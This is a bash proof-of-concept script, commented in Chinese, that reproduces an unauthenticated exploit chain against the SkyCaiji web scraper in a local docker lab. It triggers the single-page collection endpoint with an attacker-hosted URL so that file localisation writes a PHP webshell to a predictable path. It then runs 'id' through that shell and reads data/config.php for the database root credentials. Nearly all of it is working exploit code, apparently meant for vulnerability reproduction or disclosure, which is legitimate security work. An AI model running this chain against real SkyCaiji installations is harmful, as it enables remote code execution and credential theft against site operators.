#!/usr/bin/env bash
# V4 复现: 未认证单页采集 → 文件本地化 → 写 data/files/*.php → webshell → RCE → 读永久凭据
# 前置: docker compose up -d --build 已启动; SkyCaiji 已安装(可先跑 run.sh, 或本脚本自动安装)
set -u
BASE="http://127.0.0.1:8899/index.php"
WEB="http://127.0.0.1:8899"
J="$(mktemp)"

echo "==> [1/6] 等待 MySQL(含 skycaiji 库) 就绪"
for i in $(seq 1 60); do docker exec sc-db mysql -uroot -proot123 -e "use skycaiji" >/dev/null 2>&1 && { echo "    ready"; break; }; sleep 2; done

echo "==> [2/6] 安装 SkyCaiji(若未安装)"
if ! docker exec sc-app test -f /var/www/html/data/install.lock; then
  curl -s -c "$J" -b "$J" "$BASE?s=/install/index/step2" \
    --data-urlencode "db_host=db" --data-urlencode "db_port=3306" --data-urlencode "db_name=skycaiji" \
    --data-urlencode "db_user=root" --data-urlencode "db_pwd=root123" --data-urlencode "db_prefix=sky" \
    --data-urlencode "user_name=admin" --data-urlencode "user_pwd=admin888" \
    --data-urlencode "user_repwd=admin888" --data-urlencode "user_email=admin@test.com" >/dev/null
  curl -s -c "$J" -b "$J" "$BASE?s=/install/index/step3" | grep -ao "安装完成" | head -1
fi

echo "==> [3/6] 植入\"受害者运营者配置\": 开启文件本地化 + 单页采集任务(含文件下载字段)+ 发布模块"
docker exec -i sc-db mysql -uroot -proot123 skycaiji < "$(dirname "$0")/sql/seed-rce.sql" 2>/dev/null | grep -A1 rce_task_id
docker exec sc-app sh -lc 'rm -rf /var/www/html/runtime/cache/* 2>/dev/null' || true
TID="$(docker exec -i sc-db mysql -uroot -proot123 skycaiji -N -e "SELECT id FROM sky_task WHERE module='pattern' ORDER BY id DESC LIMIT 1;" 2>/dev/null)"

echo "==> [4/6] 【未认证 0-click】触发: 单页采集攻击者落地页(正文含裸 shell URL)"
echo "    GET $BASE/api_single/$TID?url=http://metadata.internal/p"
curl -s "$BASE/api_single/$TID?url=http://metadata.internal/p" >/dev/null
SHELL_PATH="data/files/$(date -u +%Y-%m-%d)/$(php -r 'echo md5("http://metadata.internal/x.php");').php"
# 注意: 文件名=md5(文件URL), 日期为服务器日期; 若跨时区/跨天请按 data/files 实际路径调整
echo "    webshell 预期落点(路径可预测): $SHELL_PATH"
docker exec sc-app sh -lc 'find /var/www/html/data/files -name "*.php" -type f'

echo "==> [5/6] 【未认证】访问 webshell -> 命令执行(RCE)"
echo "    GET $WEB/$SHELL_PATH?c=id"
curl -s "$WEB/$SHELL_PATH?c=id"; echo

echo "==> [6/6] 【未认证】RCE -> 读取永久 DB 凭据(data/config.php)"
curl -s --get "$WEB/$SHELL_PATH" --data-urlencode "c=cat /var/www/html/data/config.php"; echo
echo
echo "==> 完成: 未认证 → 持久化 webshell/RCE → 永久数据库 root 凭据(远超临时STS)。"
rm -f "$J"
